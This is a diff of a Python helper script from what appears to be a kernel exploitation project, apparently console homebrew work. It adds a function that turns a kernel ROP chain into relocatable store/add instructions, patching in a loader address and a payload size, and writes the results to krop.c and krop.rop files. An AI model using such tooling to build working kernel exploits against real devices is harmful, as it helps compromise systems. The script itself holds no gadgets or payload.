@@ -38,9 +38,9 @@ def chunk(b, size):
 
 
 def write_c_code(krop, relocs, addr_pos, size_shift_pos, size_xor_pos, size_plain_pos):
-    output = "unsigned krop[] = {";
+    output = "unsigned krop[] = {"
     output += ", ".join(hex(int.from_bytes(x, 'little')) for x in krop)
-    output += "};\nunsigned relocs[] = {";
+    output += "};\nunsigned relocs[] = {"
     output += ", ".join(str(x) for x in relocs)
     output += "};\n"
     output += "krop[{}] = ENC_PAYLOAD_ADDR;\n".format(addr_pos)
@@ -49,6 +49,25 @@ def write_c_code(krop, relocs, addr_pos, size_shift_pos, size_xor_pos, size_plai
     output += "krop[{}] = ENC_PAYLOAD_SIZE;\n".format(size_plain_pos)
     return output
 
+
+def write_rop_code(krop, relocs, addr_pos, size_shift_pos, size_xor_pos, size_plain_pos):
+    output = ""
+    tpl = "store({}, krop + 0x{:x});\n"
+    for x, (addr, reloc) in enumerate(zip(krop, relocs)):
+        addr = int.from_bytes(addr, "little")
+        if reloc == 0:
+            s = "0x{:x}".format(addr)
+        else:
+            output += "add([sysmem_base], 0x{:x});\n".format(addr)
+            s = "&return"
+        output += tpl.format(s, x * 4)
+    output += "store([kx_loader_addr], krop + 0x{:x});\n".format(addr_pos * 4)
+    # I've hardcoded payload size to be 0x200, deal with it
+    payload_size = 0x200
+    output += "store(0x{:x}, krop + 0x{:x});\n".format((payload_size >> 2) + 0x10, size_shift_pos * 4)
+    output += "store(0x{:x}, krop + 0x{:x});\n".format(payload_size ^ 0x40, size_xor_pos * 4)
+    output += "store(0x{:x}, krop + 0x{:x});\n".format(payload_size, size_plain_pos * 4)
+    return output
 
 def main():
     if len(argv) != 3:
@@ -98,8 +117,10 @@ def main():
 
     print("Kernel rop size: 0x{:x} bytes".format(len(krop) * 4))
 
-    print(write_c_code(krop, relocs, addr_pos, size_shift_pos, size_xor_pos, size_plain_pos))
-    # write_rop_code(krop, relocs, addr_pos, size_shift_pos, size_xor_pos)
+    with open(os.path.join(argv[2], "krop.c"), "w") as fout:
+        fout.write(write_c_code(krop, relocs, addr_pos, size_shift_pos, size_xor_pos, size_plain_pos))
+    with open(os.path.join(argv[2], "krop.rop"), "w") as fout:
+        fout.write(write_rop_code(krop, relocs, addr_pos, size_shift_pos, size_xor_pos, size_plain_pos))
 
 
 if __name__ == "__main__":
